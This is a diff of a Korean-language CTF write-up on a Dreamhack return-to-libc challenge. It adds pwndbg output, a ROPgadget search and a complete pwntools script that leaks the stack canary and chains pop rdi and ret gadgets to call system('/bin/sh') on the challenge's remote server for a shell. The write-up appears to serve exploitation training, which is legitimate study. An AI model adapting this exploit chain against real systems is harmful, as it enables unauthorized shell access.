@@ -73,28 +73,7 @@ pwndbg> checksec
 
 <br>
 
-```shell
-pwndbg> vmmap
-LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
-          0x400000           0x401000 r-xp     1000 0      /home/index/rtl/rtl
-          0x600000           0x601000 r--p     1000 0      /home/index/rtl/rtl
-          0x601000           0x602000 rw-p     1000 1000   /home/index/rtl/rtl
-    0x7ffff7dcb000     0x7ffff7ded000 r--p    22000 0      /usr/lib/x86_64-linux-gnu/libc-2.31.so
-    0x7ffff7ded000     0x7ffff7f65000 r-xp   178000 22000  /usr/lib/x86_64-linux-gnu/libc-2.31.so
-    0x7ffff7f65000     0x7ffff7fb3000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
-    0x7ffff7fb3000     0x7ffff7fb7000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
-    0x7ffff7fb7000     0x7ffff7fb9000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
-    0x7ffff7fb9000     0x7ffff7fbf000 rw-p     6000 0      [anon_7ffff7fb9]
-    0x7ffff7fca000     0x7ffff7fce000 r--p     4000 0      [vvar]
-    0x7ffff7fce000     0x7ffff7fcf000 r-xp     1000 0      [vdso]
-    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000 0      /usr/lib/x86_64-linux-gnu/ld-2.31.so
-    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000 1000   /usr/lib/x86_64-linux-gnu/ld-2.31.so
-    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000 24000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
-    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 2c000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
-    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2d000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
-    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      [anon_7ffff7ffe]
-    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
-```
+![image](https://user-images.githubusercontent.com/52172169/185142486-06b26012-03df-431a-a86f-391e80aa1c6b.png)
 
 <br>
 
@@ -102,4 +81,78 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 
 ASLR이 걸려있으나, PIE는 걸려있지 않으므로 plt의 주소는 고정이 된다.
 
+코드를 보면 이미 system 함수가 사용이 되었으므로 plt에 추가가 되어있다.
 
+또한 코드 내에서 ```/bin/sh``` 문자열이 전역변수로 선언되어 있다.
+
+PIE가 없기 때문에 데이터 영역과 코드 영역의 주소는 고정되어 있으므로 /bin/sh 문자열의 주소는 고정이다.
+
+system 함수의 주소와 문자열의 주소는 아래와 같이 찾을 수 있다.
+
+<br>
+
+```
+pwndbg> plt
+0x4005b0: puts@plt
+0x4005c0: __stack_chk_fail@plt
+0x4005d0: system@plt
+0x4005e0: printf@plt
+0x4005f0: read@plt
+0x400600: setvbuf@plt
+
+pwndbg> search /bin/sh
+rtl             0x400874 0x68732f6e69622f /* '/bin/sh' */
+rtl             0x600874 0x68732f6e69622f /* '/bin/sh' */
+libc-2.31.so    0x7ffff7f7f5bd 0x68732f6e69622f /* '/bin/sh' */
+```
+
+<br>
+
+pwntools를 이용해서 찾을 수도 있어서 pwntools로 가져왔다.
+
+따라서 system plt 주소에 인자로 /bin/sh를 주면 되는데, 64비트에서는 함수의 인자는 rdi에 담긴다.
+
+따라서 rdi 가젯을 찾아야 한다.
+
+```ROPgadget --binary ./rtl --re "pop rdi"```
+
+<br>
+
+여기서 한가지 주의할 점은, system 함수로 rip가 이동할 때, 스택은 반드시 0x10단위로 정렬되어 있어야 한다는 것이라고 한다.
+
+이는 system 함수 내부에 있는 movaps 명령어 때문인데, 이 명령어는 스택이 0x10단위로 정렬되어 있지 않으면 Segmentation Fault를 발생시킨다고 한다.
+
+따라서 ret 가젯을 찾으면 된다고 한다..
+
+<br>
+
+```python
+from pwn import *
+
+# p = process('./rtl')
+
+p = remote('host3.dreamhack.games',13227)
+
+elf = ELF('./rtl')
+
+canary_leak_payload = b"A"*0x39
+p.sendafter(b"Buf: ",canary_leak_payload)
+
+p.recvuntil(canary_leak_payload)
+canary = u64(b"\x00"+ p.recvn(7))
+print("[+] Canary : ",canary)
+
+
+system_plt_addr = elf.plt['system']
+binsh = next(elf.search(b'/bin/sh\x00'))
+pop_rdi = 0x0000000000400853
+ret = 0x0000000000400285
+
+print("[+] system@plt: ", hex(system_plt_addr))
+print("[+] /bin/sh : ", hex(binsh))
+
+overwrite_payload = b"A"*0x38 + p64(canary) + b"B"*0x8 + p64(ret)+p64(pop_rdi) + p64(binsh)+ p64(system_plt_addr)
+
+p.send(overwrite_payload)
+p.interactive()
+```
